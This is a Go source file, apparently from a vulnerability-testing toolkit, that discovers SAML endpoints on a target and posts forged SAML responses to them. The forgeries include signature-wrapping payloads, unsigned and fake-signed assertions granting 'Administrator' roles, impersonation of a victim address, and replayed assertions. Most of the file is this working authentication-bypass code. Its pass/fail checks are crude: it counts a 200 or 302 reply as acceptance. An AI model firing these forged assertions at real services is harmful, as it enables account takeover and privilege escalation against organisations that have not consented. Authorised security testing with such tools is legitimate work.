package vulntest

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/internal/httpclient"
)

// SAMLClient handles SAML vulnerability testing
type SAMLClient struct {
	httpClient *HTTPClient
}

// NewSAMLClient creates a new SAML testing client
func NewSAMLClient() *SAMLClient {
	return &SAMLClient{
		httpClient: NewHTTPClient(),
	}
}

// SAMLEndpoints represents discovered SAML endpoints
type SAMLEndpoints struct {
	MetadataURL          string
	SingleSignOnURL      string
	SingleLogoutURL      string
	AssertionConsumerURL string
}

// SAMLMetadata represents SAML SP/IdP metadata
type SAMLMetadata struct {
	EntityID         string
	SingleSignOnURL  string
	SingleLogoutURL  string
	Certificates     []string
	NameIDFormats    []string
	AttributeMapping map[string]string
}

// DiscoverSAMLEndpoints discovers SAML endpoints and metadata
func (s *SAMLClient) DiscoverSAMLEndpoints(baseURL string) (*SAMLEndpoints, error) {
	endpoints := &SAMLEndpoints{}
	baseURL = strings.TrimSuffix(baseURL, "/")

	// Common SAML endpoint patterns
	metadataPaths := []string{
		"/saml/metadata",
		"/saml2/metadata",
		"/auth/saml/metadata",
		"/sso/metadata",
		"/simplesaml/saml2/idp/metadata.php",
		"/simplesamlphp/saml2/idp/metadata.php",
		"/metadata.xml",
		"/FederationMetadata/2007-06/FederationMetadata.xml",
	}

	// Look for metadata endpoint
	for _, path := range metadataPaths {
		testURL := baseURL + path
		statusCode, err := s.httpClient.CheckEndpoint(testURL)
		if err == nil && statusCode == 200 {
			endpoints.MetadataURL = testURL

			// Parse metadata to find other endpoints
			if metadata, err := s.parseMetadata(testURL); err == nil {
				endpoints.SingleSignOnURL = metadata.SingleSignOnURL
				endpoints.SingleLogoutURL = metadata.SingleLogoutURL
			}
			break
		}
	}

	// Look for SSO endpoints if not found in metadata
	if endpoints.SingleSignOnURL == "" {
		ssoPaths := []string{
			"/saml/sso",
			"/saml2/sso",
			"/auth/saml/sso",
			"/sso/saml",
			"/simplesaml/saml2/idp/SSOService.php",
		}

		for _, path := range ssoPaths {
			testURL := baseURL + path
			statusCode, err := s.httpClient.CheckEndpoint(testURL)
			if err == nil && (statusCode == 200 || statusCode == 302) {
				endpoints.SingleSignOnURL = testURL
				break
			}
		}
	}

	// Look for ACS endpoints
	acsPaths := []string{
		"/saml/acs",
		"/saml2/acs",
		"/auth/saml/acs",
		"/saml/consume",
		"/sso/acs",
		"/simplesaml/saml2/sp/AssertionConsumerService.php",
	}

	for _, path := range acsPaths {
		testURL := baseURL + path
		statusCode, err := s.httpClient.CheckEndpoint(testURL)
		if err == nil && (statusCode == 200 || statusCode == 400 || statusCode == 405) {
			endpoints.AssertionConsumerURL = testURL
			break
		}
	}

	return endpoints, nil
}

// TestSAMLVulnerabilities tests for SAML implementation vulnerabilities
func (s *SAMLClient) TestSAMLVulnerabilities(endpoints *SAMLEndpoints) ([]string, error) {
	var vulnerabilities []string

	// Test 1: XML Signature Wrapping (XSW) attacks
	if endpoints.AssertionConsumerURL != "" {
		xswVulns, err := s.testXMLSignatureWrapping(endpoints.AssertionConsumerURL)
		if err == nil {
			vulnerabilities = append(vulnerabilities, xswVulns...)
		}
	}

	// Test 2: Golden SAML attack (signature bypass)
	if endpoints.AssertionConsumerURL != "" {
		goldenVulns, err := s.testGoldenSAML(endpoints.AssertionConsumerURL)
		if err == nil {
			vulnerabilities = append(vulnerabilities, goldenVulns...)
		}
	}

	// Test 3: Assertion manipulation
	if endpoints.AssertionConsumerURL != "" {
		assertionVulns, err := s.testAssertionManipulation(endpoints.AssertionConsumerURL)
		if err == nil {
			vulnerabilities = append(vulnerabilities, assertionVulns...)
		}
	}

	// Test 4: Metadata poisoning
	if endpoints.MetadataURL != "" {
		metadataVulns, err := s.testMetadataPoisoning(endpoints.MetadataURL)
		if err == nil {
			vulnerabilities = append(vulnerabilities, metadataVulns...)
		}
	}

	// Test 5: Replay attack protection
	if endpoints.AssertionConsumerURL != "" {
		replayVulns, err := s.testReplayAttacks(endpoints.AssertionConsumerURL)
		if err == nil {
			vulnerabilities = append(vulnerabilities, replayVulns...)
		}
	}

	return vulnerabilities, nil
}

// parseMetadata attempts to parse SAML metadata
func (s *SAMLClient) parseMetadata(metadataURL string) (*SAMLMetadata, error) {
	body, err := s.httpClient.GetResponseBody(metadataURL)
	if err != nil {
		return nil, err
	}

	metadata := &SAMLMetadata{}

	// Extract EntityID
	if entityMatch := regexp.MustCompile(`entityID="([^"]+)"`).FindStringSubmatch(body); len(entityMatch) > 1 {
		metadata.EntityID = entityMatch[1]
	}

	// Extract SSO URL
	if ssoMatch := regexp.MustCompile(`Location="([^"]*(?:SSO|sso)[^"]*)"`).FindStringSubmatch(body); len(ssoMatch) > 1 {
		metadata.SingleSignOnURL = ssoMatch[1]
	}

	// Extract SLO URL
	if sloMatch := regexp.MustCompile(`Location="([^"]*(?:SLO|slo|logout)[^"]*)"`).FindStringSubmatch(body); len(sloMatch) > 1 {
		metadata.SingleLogoutURL = sloMatch[1]
	}

	return metadata, nil
}

// testXMLSignatureWrapping tests for XSW vulnerabilities
func (s *SAMLClient) testXMLSignatureWrapping(acsURL string) ([]string, error) {
	var vulnerabilities []string

	// Test different XSW attack vectors
	xswPayloads := []struct {
		name    string
		payload string
	}{
		{
			name:    "XSW1 - Comment-based wrapping",
			payload: s.createXSW1Payload(),
		},
		{
			name:    "XSW2 - Clone signature wrapping",
			payload: s.createXSW2Payload(),
		},
		{
			name:    "XSW3 - Transform-based wrapping",
			payload: s.createXSW3Payload(),
		},
	}

	for _, xsw := range xswPayloads {
		if s.testSAMLAssertion(acsURL, xsw.payload) {
			vulnerabilities = append(vulnerabilities,
				fmt.Sprintf("SAML implementation vulnerable to %s", xsw.name))
		}
	}

	return vulnerabilities, nil
}

// testGoldenSAML tests for Golden SAML attack (signature bypass)
func (s *SAMLClient) testGoldenSAML(acsURL string) ([]string, error) {
	var vulnerabilities []string

	// Test unsigned assertions
	unsignedAssertion := s.createUnsignedSAMLAssertion("admin@company.com")
	if s.testSAMLAssertion(acsURL, unsignedAssertion) {
		vulnerabilities = append(vulnerabilities, "SAML accepts unsigned assertions (Golden SAML vulnerable)")
	}

	// Test weak signature validation
	weakSignedAssertion := s.createWeakSignedSAMLAssertion("admin@company.com")
	if s.testSAMLAssertion(acsURL, weakSignedAssertion) {
		vulnerabilities = append(vulnerabilities, "SAML has weak signature validation")
	}

	return vulnerabilities, nil
}

// testAssertionManipulation tests for assertion manipulation vulnerabilities
func (s *SAMLClient) testAssertionManipulation(acsURL string) ([]string, error) {
	var vulnerabilities []string

	// Test privilege escalation via assertion manipulation
	adminAssertion := s.createEscalatedSAMLAssertion("admin", "administrator")
	if s.testSAMLAssertion(acsURL, adminAssertion) {
		vulnerabilities = append(vulnerabilities, "SAML allows privilege escalation via assertion manipulation")
	}

	// Test user impersonation
	impersonationAssertion := s.createImpersonationSAMLAssertion("victim@company.com")
	if s.testSAMLAssertion(acsURL, impersonationAssertion) {
		vulnerabilities = append(vulnerabilities, "SAML allows user impersonation via assertion manipulation")
	}

	return vulnerabilities, nil
}

// testMetadataPoisoning tests for metadata manipulation vulnerabilities
func (s *SAMLClient) testMetadataPoisoning(metadataURL string) ([]string, error) {
	var vulnerabilities []string

	// This is harder to test without being able to modify the metadata
	// For now, just check if metadata is accessible without authentication
	statusCode, err := s.httpClient.CheckEndpoint(metadataURL)
	if err == nil && statusCode == 200 {
		vulnerabilities = append(vulnerabilities, "SAML metadata is publicly accessible (potential for metadata poisoning)")
	}

	return vulnerabilities, nil
}

// testReplayAttacks tests for replay attack protection
func (s *SAMLClient) testReplayAttacks(acsURL string) ([]string, error) {
	var vulnerabilities []string

	// Create assertion with old timestamp
	oldAssertion := s.createTimestampedSAMLAssertion("user@company.com", time.Now().Add(-24*time.Hour))
	if s.testSAMLAssertion(acsURL, oldAssertion) {
		vulnerabilities = append(vulnerabilities, "SAML accepts assertions with old timestamps (replay attack vulnerable)")
	}

	// Test assertion reuse
	normalAssertion := s.createTimestampedSAMLAssertion("user@company.com", time.Now())
	if s.testSAMLAssertion(acsURL, normalAssertion) {
		// Try to reuse the same assertion
		if s.testSAMLAssertion(acsURL, normalAssertion) {
			vulnerabilities = append(vulnerabilities, "SAML allows assertion replay attacks")
		}
	}

	return vulnerabilities, nil
}

// testSAMLAssertion sends a SAML assertion to the ACS endpoint
func (s *SAMLClient) testSAMLAssertion(acsURL, assertion string) bool {
	// Encode assertion as would be done in SAML POST binding
	encodedAssertion := base64.StdEncoding.EncodeToString([]byte(assertion))

	// Create form data
	formData := url.Values{}
	formData.Set("SAMLResponse", encodedAssertion)
	formData.Set("RelayState", "test")

	// Send POST request
	resp, err := s.httpClient.Client.Post(acsURL, "application/x-www-form-urlencoded", strings.NewReader(formData.Encode()))
	if err != nil {
		return false
	}
	defer httpclient.CloseBody(resp)

	// Check if assertion was accepted (various success indicators)
	return resp.StatusCode == 200 || resp.StatusCode == 302
}

// Helper functions to create various SAML payloads

func (s *SAMLClient) createXSW1Payload() string {
	// XSW1 - Comment-based signature wrapping attack
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <!-- XSW1 attack: Original assertion wrapped in comment -->
        <!--
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">user@company.com</saml:NameID>
        </saml:Subject>
        -->
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@company.com</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="` + time.Now().Add(-5*time.Minute).Format(time.RFC3339) + `" NotOnOrAfter="` + time.Now().Add(60*time.Minute).Format(time.RFC3339) + `">
            <saml:AudienceRestriction><saml:Audience>https://sp.example.com</saml:Audience></saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) createXSW2Payload() string {
	// XSW2 - Clone signature attack
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
                <ds:Reference URI="#_` + s.generateID() + `"></ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>fake_signature_value</ds:SignatureValue>
        </ds:Signature>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@company.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) createXSW3Payload() string {
	// XSW3 - Transform-based attack
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
                <ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
                <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
                <ds:Reference URI="">
                    <ds:Transforms>
                        <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xpath-19991116">
                            <ds:XPath>not(ancestor-or-self::saml:Attribute)</ds:XPath>
                        </ds:Transform>
                    </ds:Transforms>
                </ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>fake_signature_value</ds:SignatureValue>
        </ds:Signature>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@company.com</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) createUnsignedSAMLAssertion(email string) string {
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">` + email + `</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="` + time.Now().Add(-5*time.Minute).Format(time.RFC3339) + `" NotOnOrAfter="` + time.Now().Add(60*time.Minute).Format(time.RFC3339) + `">
            <saml:AudienceRestriction><saml:Audience>https://sp.example.com</saml:Audience></saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) createWeakSignedSAMLAssertion(email string) string {
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
                <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#hmac-sha1"/>
                <ds:Reference URI="#_` + s.generateID() + `"></ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>weak_signature_12345</ds:SignatureValue>
        </ds:Signature>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">` + email + `</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>Administrator</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) createEscalatedSAMLAssertion(username, role string) string {
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + time.Now().Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">` + username + `</saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>` + role + `</saml:AttributeValue></saml:Attribute>
            <saml:Attribute Name="Permissions"><saml:AttributeValue>admin,write,delete</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) createImpersonationSAMLAssertion(victimEmail string) string {
	return s.createUnsignedSAMLAssertion(victimEmail)
}

func (s *SAMLClient) createTimestampedSAMLAssertion(email string, timestamp time.Time) string {
	return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + timestamp.Format(time.RFC3339) + `">
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
    <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_` + s.generateID() + `" Version="2.0" IssueInstant="` + timestamp.Format(time.RFC3339) + `">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">` + email + `</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="` + timestamp.Add(-5*time.Minute).Format(time.RFC3339) + `" NotOnOrAfter="` + timestamp.Add(60*time.Minute).Format(time.RFC3339) + `">
            <saml:AudienceRestriction><saml:Audience>https://sp.example.com</saml:Audience></saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AttributeStatement>
            <saml:Attribute Name="Role"><saml:AttributeValue>User</saml:AttributeValue></saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>`
}

func (s *SAMLClient) generateID() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return fmt.Sprintf("%x", bytes)
}
